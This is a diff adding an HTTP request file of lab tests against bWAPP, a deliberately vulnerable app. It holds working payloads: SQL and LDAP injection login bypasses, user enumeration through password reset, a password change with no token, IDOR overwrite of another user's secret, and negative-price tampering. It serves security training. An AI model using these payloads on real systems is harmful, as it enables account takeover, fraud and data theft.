@@ -1,0 +1,208 @@
+### ============================================================================
+### 06 - A7 Identification and Authentication Failures
+###         A2 Cryptographic Failures
+###         A4 Insecure Design (business logic)
+###
+###   bWAPP ships four deliberately broken login pages, a password-reset oracle,
+###   a session model with no authorization, and object references that trust
+###   client-supplied identifiers.
+### ============================================================================
+
+### ---------------------------------------------------------------------------
+### AUTH-01  Hardcoded / default credentials
+###   These are the documented bWAPP defaults AND they are published
+###   unauthenticated on /admin/ (see 08-info-disclosure.http INFO-01), so
+###   there is nothing to brute force - just read them.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/login.php HTTP/1.1
+Host: localhost:8080
+Content-Type: application/x-www-form-urlencoded
+
+login=bee&password=bug&security_level=0&form=submit
+### Expected: 302 -> index.php, valid session, "Welcome Bee"
+
+
+### ---------------------------------------------------------------------------
+### AUTH-02  Broken login #1 - classic SQLi auth bypass
+###   ba_insecure_login_1.php concatenates both fields into the query.
+###   The '#' comments out the password half of the WHERE clause.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/ba_insecure_login_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=admin%27%20OR%20%271%27%3D%271%27%20%23&password=anything&form=submit
+### Expected: 200, "Welcome ..." in the menu - authenticated as the first account
+
+
+### ---------------------------------------------------------------------------
+### AUTH-03  Broken login #2 - the password is not checked server-side at all
+###   Any password is accepted as long as the username exists. Note the
+###   response is much larger than a normal login page: this variant also
+###   renders the matched user's record.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/ba_insecure_login_2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=bee&password=totally-wrong-password&form=submit
+### Expected: 200, login SUCCEEDS despite the wrong password
+
+
+### ---------------------------------------------------------------------------
+### AUTH-04  Broken login #3 - loose/weak password comparison
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/ba_insecure_login_3.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=bee&password=bug&form=submit
+### Expected: 200, authenticated
+
+
+### ---------------------------------------------------------------------------
+### AUTH-05  User enumeration via the forgotten-password oracle
+###   Two requests, different wording in the response. Automation can turn
+###   this into a reliable account list before any password attack.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/ba_forgotten.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=A.I.M.&form=submit
+### Expected: 200, "the E-Mail ... is sent" - account EXISTS
+###
+### ...and the negative control:
+POST {{baseUrl}}/ba_forgotten.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=no-such-user-xyz&form=submit
+### Expected: 200, different wording ("invalid" / "not found") - account absent
+
+
+### ---------------------------------------------------------------------------
+### AUTH-06  Weak password policy - trivial passwords are accepted
+###   The policy check is advisory only; the change still succeeds.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/ba_weak_pwd.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=bee&password=1&form=submit
+### Expected: 200, the password is changed to "1" without objection
+
+
+### ---------------------------------------------------------------------------
+### AUTH-07  Password change with no CSRF token and no old-password check
+###   Also part one of the CSRF chain in 07-csrf-clickjacking-cors.http.
+###   WARNING: this rewrites the bee account's password for the whole lab.
+###   Reset it afterwards with AUTH-08.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/csrf_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+password=pwned&password_conf=pwned&form=submit
+### Expected: 200, password changed; no token was required
+
+
+### ---------------------------------------------------------------------------
+### AUTH-08  Restore the lab password after AUTH-07
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/password_change.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+password=bug&password_conf=bug&form=submit
+### Expected: 200, password restored to "bug"
+
+
+### ---------------------------------------------------------------------------
+### AUTH-09  No authorization on the secret endpoint
+###   secret.php is served to any valid session and returns the raw secret in
+###   text/plain - no admin check, no ownership check, no rate limit.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/secret.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200 text/plain "Your secret: <value>"
+
+
+### ---------------------------------------------------------------------------
+### AUTH-10  IDOR - overwrite ANOTHER user's secret
+###   insecure_direct_object_ref_1.php takes the target account from a
+###   `login` field instead of the session. No token is required at level 0.
+###   Verify with AUTH-09 while logged in as the admin account.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/insecure_direct_object_ref_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=A.I.M.&secret=pwned-by-idor&action=change
+### Expected: 200, success message; A.I.M.'s secret is now "pwned-by-idor"
+
+
+### ---------------------------------------------------------------------------
+### AUTH-11  LDAP injection - wildcard auth bypass
+###   ldap_connect.php builds an LDAP filter by concatenation. "*" matches
+###   every entry, so both the user and password filters are satisfied.
+###   Works even without the wildcard password because the filter is
+###   (uid=*)(password=*) style - i.e. the server is queried anonymously.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/ldap_connect.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=*&password=*&form=submit
+### Expected: 200, "Welcome ..." - authenticated, no valid credentials used
+
+
+### ---------------------------------------------------------------------------
+### AUTH-12  Business logic - negative ticket price
+###   insecure_direct_object_ref_2.php multiplies quantity by price with no
+###   server-side bound. A negative price produces a negative total, i.e. the
+###   attacker is paid to buy.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/insecure_direct_object_ref_2.php?ticket_quantity=2&ticket_price=-100&action=go HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, ticket total shows a negative amount
+
+
+### ---------------------------------------------------------------------------
+### AUTH-13  Session management - the security level is a client-controlled cookie
+###   Re-send SQLI-01 from 01-sqli.http but claim security_level=2 (the
+###   "hardened" setting). The injection still works, because the app trusts
+###   whatever the client sends. This is the single most important
+###   architectural flaw in bWAPP: the security control is client-side only.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_1.php?title=%27%20OR%201%3D1--%20-&action=go HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID={{session}}; security_level=2
+### Expected: 200, all 9 movies - SQLi succeeds while the app believes it is
+###           running at the "high" security level
+
+
+### ---------------------------------------------------------------------------
+### AUTH-14  Session id accepted from the client (fixation surface)
+###   bWAPP's session cookie is a plain PHPSESSID with no Secure, HttpOnly or
+###   SameSite attributes. The request below shows the Set-Cookie bWAPP issues;
+###   compare the attributes with your own policy baseline.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/login.php HTTP/1.1
+Host: localhost:8080
+Content-Type: application/x-www-form-urlencoded
+
+login=bee&password=bug&security_level=0&form=submit
+### Expected: Set-Cookie: PHPSESSID=...; path=/     <- no HttpOnly, no Secure, no SameSite
